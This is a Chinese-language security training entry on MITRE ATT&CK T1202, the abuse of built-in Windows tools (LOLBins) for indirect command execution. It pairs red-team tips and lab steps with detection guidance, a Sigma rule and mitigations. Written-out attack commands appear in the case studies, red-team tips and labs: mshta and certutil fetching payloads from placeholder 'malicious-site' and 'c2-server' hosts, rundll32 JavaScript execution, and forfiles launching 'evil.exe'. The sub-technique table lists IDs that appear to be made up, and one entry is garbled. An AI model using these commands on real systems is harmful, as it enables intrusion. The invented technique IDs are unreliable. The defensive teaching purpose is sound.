# 间接命令执行 (T1202)

## 一句话通俗理解

> **不直接用cmd.exe执行命令，而是用系统自带的"合法"工具来偷偷执行，骗过安全软件**

## 30秒速查卡

| 维度 | 你需要知道的 |
|------|-------------|
| 这是什么？ | 利用系统自带工具（LOLBins）执行恶意命令的技术 |
| 为什么危险？ | 使用合法签名工具绕过应用白名单和安全检测 |
| 谁需要关心？ | 系统管理员、安全运维团队、EDR管理员 |
| 你的第一步防御 | 监控系统工具的异常使用模式（如certutil下载文件） |
| 如果只做一件事 | 部署Sysmon监控系统工具的网络和子进程行为 |

## 难度等级

⭐⭐ 中级 - 需要Windows系统工具知识和命令行经验

## 前置知识检查

**读这个文件需要什么？**

- [ ] Windows系统工具（certutil, mshta, wscript, rundll32等）
- [ ] 命令行和脚本编写基础
- [ ] 应用白名单（AppLocker, WDAC）原理

## 技术描述

### 通俗解释

想象一个保安在门口检查包裹，他的规则是"只让穿制服的人进"。攻击者发现清洁工、快递员、维修工都穿制服，于是穿上这些制服混进去。间接命令执行就是这个思路——安全软件通常信任系统自带的工具（因为它们有微软签名），攻击者就利用这些工具来执行恶意代码，安全软件看到的是"certutil在运行"而不是"恶意程序在运行"。

### 过渡段

简单来说，Windows有很多自带工具具有代码执行能力（如mshta可执行HTML中的VBScript，rundll32可执行DLL中的函数）。这些工具被称为LOLBins（Living Off The Land Binaries），攻击者用它们来执行payload，绕过应用白名单。

### 技术原理

间接命令执行常用的LOLBins：
1. **certutil.exe**：原本用于证书管理，但可解码Base64和下载文件
2. **mshta.exe**：执行HTA（HTML Application）文件中的脚本
3. **rundll32.exe**：执行DLL中的导出函数
4. **regsvr32.exe**：注册COM组件，但可执行远程脚本
5. **wmic.exe**：WMI命令行工具，可远程执行进程
6. **forfiles.exe**：本用于文件搜索，但可配合/p参数执行任意命令
7. **atbroker.exe**：辅助功能工具，可执行命令

### 用途与影响

间接命令执行是绕过应用白名单和EDR检测的核心技术，被几乎所有APT组织和勒索团伙广泛使用。由于使用的是合法系统工具，传统基于签名的安全产品难以检测。

## 子技术列表

| 子技术ID | 名称 | 说明 |
|----------|------|------|
| T1202.001 | Control Panel Items | 控制面板项 |
| T1202.002 | Execution through CL_LoadAssembly.WSF | 通过WSF执行 |
| T1202.004 | Indirect Command Execution via KDE] | KDE间接执行 |
| T1202.005 | Indirect Command Execution via cscript/wscript | 通过脚本宿主执行 |

## 攻击流程

```mermaid
flowchart LR
    A[识别目标系统防护] --> B[选择合适的LOLBin]
    B --> C[构造payload]
    C --> D[通过LOLBin执行]
    D --> E[安全软件放行]
    E --> F[payload执行成功]
```

### 步骤详解
1. 攻击者分析目标系统的防护策略（AppLocker规则、EDR配置）
2. 选择能绕过防护的系统工具（如AppLocker不限制rundll32）
3. 构造payload（如将恶意脚本编码为Base64嵌入HTA文件）
4. 通过LOLBin执行payload
5. 安全软件因工具是合法签名而不拦截
6. payload成功执行，建立C2连接或下载后续模块

## 真实案例

### 案例1：APT29使用mshta执行payload（2020年）
- **时间**：2020年
- **目标**：政府机构和智库
- **攻击组织**：APT29（Cozy Bear）
- **手法**：在钓鱼邮件中包含一个快捷方式文件，点击后执行`mshta.exe https://malicious-site/payload.hta`。HTA文件中嵌入了VBScript，通过mshta执行可绕过AppLocker对PowerShell和cmd的限制。VBScript下载并执行Cobalt Strike beacon，整个过程中没有直接调用powershell.exe或cmd.exe
- **影响**：多个目标被成功入侵，绕过了基于应用白名单的防护
- **参考链接**：CISA AA20-298B报告

### 案例2：FIN7使用rundll32执行后门（2018-2019年）
- **时间**：2018-2019年
- **目标**：零售企业POS系统
- **攻击组织**：FIN7
- **手法**：FIN7在目标系统上部署了伪装成合法DLL的后门文件，然后使用`rundll32.exe C:\temp\legit.dll,StartW`来执行后门。由于rundll32是系统签名工具且通常被加入AppLocker白名单，安全软件不会拦截。后门通过 rundll32 进程发起的HTTPS连接与C2服务器通信，在网络层面看起来也是合法的系统行为
- **影响**：持续窃取多个零售商的信用卡数据
- **参考链接**：CrowdStrike FIN7分析报告

### 案例3：Conti勒索软件使用certutil下载工具（2021年）
- **时间**：2021年
- **目标**：医疗和制造业
- **攻击组织**：Conti
- **手法**：在获取初始访问后，Conti操作者使用`certutil.exe -urlcache -split -f http://c2-server/tools.zip C:\temp\tools.zip`来下载攻击工具包。certutil原本是证书管理工具，但其-urlcache参数可以下载任意文件。由于certutil是系统签名工具且不在安全软件的监控黑名单中，下载操作未触发告警。随后使用`certutil.exe -decode C:\temp\encoded.txt C:\temp\payload.exe`解码Base64编码的可执行文件
- **影响**：成功在多个目标环境中部署勒索软件
- **参考链接**：CISA Conti分析报告AA21-265A

## 红队视角

### 实战技巧
- 优先使用不在AppLocker默认规则中的工具（如mshta, forfiles）
- payload编码为Base64减少特征码检测
- 使用`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`执行JS
- forfiles配合/p参数可执行任意命令：`forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c evil.exe"`

### 常用工具
| 工具 | 类型 | 特点 |
|------|------|------|
| mshta.exe | 系统工具 | 执行HTA中的脚本 |
| certutil.exe | 系统工具 | 下载和解码文件 |
| rundll32.exe | 系统工具 | 执行DLL导出函数 |
| regsvr32.exe | 系统工具 | 执行远程SCT脚本 |
| wmic.exe | 系统工具 | 远程进程创建 |
| forfiles.exe | 系统工具 | 间接命令执行 |

## 蓝队视角

### 检测要点
- 监控LOLBin工具的异常命令行参数（如certutil的-urlcache）
- 检测系统工具发起的网络连接
- 监控rundll32/mshta/regsvr32的子进程创建
- 检测系统工具从非标准目录执行

### 监控建议
- 部署Sysmon Event ID 1（进程创建）监控命令行参数
- 配置Sysmon Event ID 3（网络连接）监控LOLBin的网络行为
- 使用AppLocker日志监控被阻止的执行

## 避坑指南

- 不要将LOLBin工具加入EDR白名单——它们是最常用的攻击入口
- LOLBins的清单需要持续更新，新工具不断被发现
- 仅监控进程名不够，需要分析完整的命令行参数

## 检测建议

### 网络层
- 监控certutil.exe发起的HTTP/HTTPS连接
- 检测mshta.exe和regsvr32.exe的网络通信

### 主机层
- **用人话说**：系统会记录每个程序启动时的命令行参数，重点关注系统工具被用于"不正常"的操作（如证书工具在下载文件）
```yaml
# 关键监控点
Event ID: 1  # Sysmon进程创建
# 关注：certutil + -urlcache, mshta + http, rundll32 + javascript
```

### 应用层
```yaml
# Sigma规则：检测LOLBin滥用
title: 检测可疑LOLBin使用
status: experimental
description: 检测系统工具被用于可疑目的
logsource:
    category: process_creation
    product: windows
detection:
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
    selection_mshta:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http'
            - '.hta'
    selection_rundll32:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains:
            - 'javascript:'
            - 'http'
    condition: selection_certutil or selection_mshta or selection_rundll32
level: high
```

## 缓解措施

### 优先级1（必须实施）
- 部署Sysmon监控LOLBin工具的命令行和网络行为
- 配置AppLocker限制LOLBin从用户目录执行
- 监控certutil, mshta, rundll32的异常使用

### 优先级2（推荐实施）
- 使用WDAC（Windows Defender Application Control）细化策略
- 限制regsvr32的远程执行能力（/s /u /i:http://）
- 部署ASR（Attack Surface Reduction）规则

### 优先级3（长期规划）
- 实施行为分析系统识别LOLBin异常模式
- 建立LOLBin使用基线，偏离时告警

## 动手实验

### 实验1：使用certutil下载文件
```bash
# 预期输出：成功下载文件到指定路径
certutil.exe -urlcache -split -f https://example.com/test.txt C:\temp\test.txt
# 验证：检查C:\temp\test.txt是否存在
```

### 实验2：使用mshta执行VBScript
```bash
# 预期输出：弹出计算器（证明脚本执行成功）
mshta.exe vbscript:CreateObject("WScript.Shell").Run("calc.exe")(Window.close)
```

## 术语解释

| 术语 | 说明 |
|------|------|
| LOLBin | Living Off The Land Binary，系统自带的可被滥用的工具 |
| AppLocker | Windows应用白名单功能 |
| WDAC | Windows Defender Application Control，新一代应用控制 |
| HTA | HTML Application，可执行脚本的HTML文件 |
| ASR | Attack Surface Reduction，攻击面缩减规则 |

## 参考资料

### 📚 深入了解
- [MITRE ATT&CK T1202](https://attack.mitre.org/techniques/T1202/)
- [LOLBAS项目](https://lolbas-project.github.io/) - Windows LOLBin清单

### 📰 真实攻击
- [CISA APT29报告AA20-298B](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-298b)
- [CrowdStrike FIN7报告](https://www.crowdstrike.com/)

### 🔧 动手试试
- [LOLBAS项目GitHub](https://github.com/LOLBAS-Project/LOLBAS)
- [Sysmon配置指南](https://github.com/SwiftOnSecurity/sysmon-config)
